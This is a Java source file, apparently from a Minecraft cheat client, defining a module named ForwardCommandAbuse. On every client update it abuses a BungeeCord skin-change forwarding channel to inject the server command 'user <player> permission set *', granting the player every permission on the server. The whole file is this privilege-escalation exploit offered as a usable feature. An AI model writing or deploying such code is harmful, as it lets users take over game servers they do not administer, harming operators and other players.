package it.nobusware.client.mods;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;

import QuarantineAPI.config.annotation.Handler;
import io.netty.buffer.Unpooled;
import it.nobusware.client.events.EventUpdate;
import it.nobusware.client.manager.Module;
import it.nobusware.client.utils.BungeeChannelUtil;
import it.nobusware.client.utils.ChatUtils;
import net.minecraft.client.Minecraft;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;

public class ForwardCommandAbuse extends Module {

	public ForwardCommandAbuse(String nome_mod, int tasto, String nome_array_printed, Category categoria) {
		super(nome_mod, tasto, nome_array_printed, categoria);
	}

	public void Abilitato() {
		}
	//Bl0cket
	@Handler
	public void onUpdate(EventUpdate e) {
		BungeeChannelUtil.ChangeSkinForwardCommand("alert", "user " + Minecraft.getMinecraft().getSession().getUsername() + " permission set *", false, false);
	}
}
